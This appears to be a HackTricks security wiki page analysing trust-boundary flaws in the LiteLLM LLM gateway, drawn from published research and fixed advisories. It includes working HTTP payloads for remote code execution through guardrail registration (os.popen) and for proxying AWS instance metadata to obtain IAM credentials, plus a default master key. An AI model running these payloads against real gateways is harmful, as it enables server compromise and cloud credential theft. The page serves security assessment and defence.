# LLM Gateway Trust Boundaries

{{#include ../banners/hacktricks-training.md}}

An LLM gateway handles model routing and often holds provider credentials, so its ordinary API callers must not inherit configuration or provider-level authority. The LiteLLM gateway assessment on version 1.77.7 illustrates two separate boundaries: UI-session authorization for administrative configuration and caller-supplied routing configuration for inference. The reported issues were fixed in version 1.83.9.<sup>[[1]](#references)</sup>

## UI route classification is not authorization

In the assessed LiteLLM version, UI login keys belonged to the `litellm-dashboard` team. Authorization classified a key as a UI token from that team identifier, regardless of the user's role. The UI route check then accepted any route beginning with an allowlisted prefix. As a result, the `/config` entry also matched the administrative `/config/update` handler. That handler required generic authentication but did not independently require `PROXY_ADMIN`, so a lower-privileged UI session crossed into configuration write access.<sup>[[1]](#references)</sup>

This differs from a proxy/backend path-normalization mismatch: the authorization code and handler disagree about the authority of the *same* route.<sup>[[1]](#references)</sup> When reviewing a gateway, compare token classification, exact route and method matching, and the handler's own role check.<sup>[[1]](#references)</sup> See [web API authorization](../pentesting-web/web-api-pentesting.md), [401/403 bypasses](../pentesting-web/403-and-401-bypasses.md), and [proxy prefix exemptions](../pentesting-web/proxy-waf-protections-bypass.md#prefix-exemptions-become-routing-keys) for related but distinct boundaries.

## Configuration writes reach more than the configuration store

The same LiteLLM configuration update accepted environment-variable values and applied them to the running process. One consumer treated `UI_LOGO_PATH` as a local path for a `FileResponse`, without validating that it identified a logo; another read `UI_USERNAME` and `UI_PASSWORD` during non-SSO login and assigned `PROXY_ADMIN` when they matched. Thus a configuration-write permission could become both local-file disclosure and an administrative identity change, depending on the downstream consumer. The response media type does not establish that a served file is an image.<sup>[[1]](#references)</sup>

The pass-through endpoint configuration was another downstream sink. Initialization accepted remote S3/GCS adapter targets, downloaded Python modules, and imported them using `importlib`'s `exec_module`. Import executes top-level code before an adapter instance is used; merely restricting invocation of the adapter would not remove that execution boundary. Treat this as configuration-controlled code loading, not model-file deserialization.<sup>[[1]](#references)</sup> For the separate file-read primitive, see [file inclusion and path traversal](../pentesting-web/file-inclusion/).

## Per-request model routing can leak gateway credentials

LiteLLM's client-side credential feature accepted a `user_config` object in an LLM request. The assessed route created a temporary `litellm.Router` from that object, including its model list and provider `api_base`. A caller-controlled provider destination could receive the gateway's outbound completion request and configured provider authentication headers. Restrictions on top-level `api_base` or `api_key` fields did not cover this separate nested configuration path. This is a credential-bearing SSRF boundary, rather than a prompt-injection issue.<sup>[[1]](#references)</sup>

For an authorized gateway assessment, compare every path that can construct a router or provider client, including per-request configuration, against the destination and credential policy used by the normal configured route.<sup>[[1]](#references)</sup> The [SSRF guide](../pentesting-web/ssrf-server-side-request-forgery/) covers general server-side destination control; the gateway-specific failure is allowing a less-trusted request object to select a destination while reusing privileged outbound credentials.<sup>[[1]](#references)</sup>

## Guardrail registration can bypass a UI-only sandbox

A gateway's code-test path and code-registration path may have different validation. In LiteLLM before v1.82.0, the UI custom-guardrail test rejected dangerous syntax and executed with `__builtins__ = {}`, but `POST /guardrails` compiled the submitted `custom_code` with `exec(compile(...), exec_globals)` without either check. Python inserts builtins into a globals dictionary that lacks `__builtins__`, so module-level imports and commands ran **when the guardrail was registered**, before any inference call. The later `apply_guardrail` callback could expose a stored result through its block reason.<sup>[[2]](#references)[[3]](#references)</sup>

For an authorized test, compare the test and registration handlers rather than assuming a successful UI sandbox test proves registration safe. The reported pre-fix request shape was:<sup>[[2]](#references)</sup>

```http
POST /guardrails HTTP/1.1
Authorization: Bearer <master_key>
Content-Type: application/json

{
  "guardrail": {
    "guardrail_name": "probe",
    "litellm_params": {
      "guardrail": "custom_code", "mode": "pre_call", "default_on": true,
      "custom_code": "import os\nresult = os.popen('id').read()\ndef apply_guardrail(inputs, request_data, input_type):\n    return {'action': 'block', 'reason': result}"
    }
  }
}
```

The registration endpoint also accepted ordinary API keys because it lacked a `PROXY_ADMIN` check. Where no master key or JWT/OAuth2 authentication was configured, the pre-fix auth handler assigned `PROXY_ADMIN` even to anonymous requests. An unchanged example master key (`sk-1234`) supplied another admin path. The fix changed the no-auth role to `INTERNAL_USER`, added guardrail admin checks, and validated and restricted builtins during registration. These role and code-execution boundaries are separate from the [MCP token-fallback issue](AI-MCP-Servers.md#mcp-token-passthrough-must-not-create-an-anonymous-session).<sup>[[2]](#references)[[3]](#references)</sup>

## Admin pass-through routes can proxy cloud metadata

LiteLLM's pass-through endpoint feature lets an administrator configure an HTTP target and optionally append subpaths. Unlike the per-request `user_config` routing issue above, this requires **configuration-write authority**; the feature itself is intended to trust administrators. In the reported deployment, the target was not checked against private or link-local addresses. Before v1.83.0, `/config/update` also accepted ordinary authenticated keys and could update pass-through configuration.<sup>[[2]](#references)[[4]](#references)</sup>

With that authority and network reachability from the proxy to EC2 metadata, a route such as the following exposes metadata through the gateway. The `include_subpath` flag makes `/meta/meta-data/iam/security-credentials/` map under `/latest/`.<sup>[[2]](#references)[[4]](#references)</sup>

```http
POST /config/pass_through_endpoint HTTP/1.1
Authorization: Bearer <master_key>
Content-Type: application/json

{"path":"/meta","target":"http://169.254.169.254/latest/","headers":{},"include_subpath":true}
```

For IMDSv2, a GET alone is not sufficient: the proxy must permit a `PUT` to `/meta/api/token` and relay the token-request header, then relay the returned token on a GET to `/meta/meta-data/iam/security-credentials/<role>`.<sup>[[2]](#references)[[5]](#references)</sup> LiteLLM's `x-pass-` header handling strips that prefix before forwarding, so `x-pass-X-aws-ec2-metadata-token-ttl-seconds: 21600` and `x-pass-X-aws-ec2-metadata-token: <token>` can supply those headers.<sup>[[2]](#references)</sup> Reachability and the IMDSv2 response hop limit still matter, especially from a container.<sup>[[5]](#references)</sup> See [Cloud SSRF](../pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.md#aws) for the metadata workflow and limits; this gateway variation is the **admin-controlled persistent route plus request-header relay**.

## References

- [1] [Check Point Research — When LLM Gateways Go Wrong: Findings from LiteLLM](https://research.checkpoint.com/2026/when-llm-gateways-go-wrong-findings-from-litellm/)
- [2] [Wiz — Off Guard: Breaking LiteLLM from Authentication Bypass to Cloud Compromise](https://wiz.io/blog/off-guard-breaking-litellm-from-authentication-bypass-to-cloud-compromise)
- [3] [LiteLLM PR #22095 — fix unauthenticated RCE and sandbox escape in custom code guardrail](https://github.com/BerriAI/litellm/pull/22095)
- [4] [LiteLLM — Create Pass Through Endpoints](https://docs.litellm.ai/docs/proxy/pass_through)
- [5] [AWS — How Instance Metadata Service Version 2 works](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-v2-how-it-works.html)

{{#include ../banners/hacktricks-training.md}}
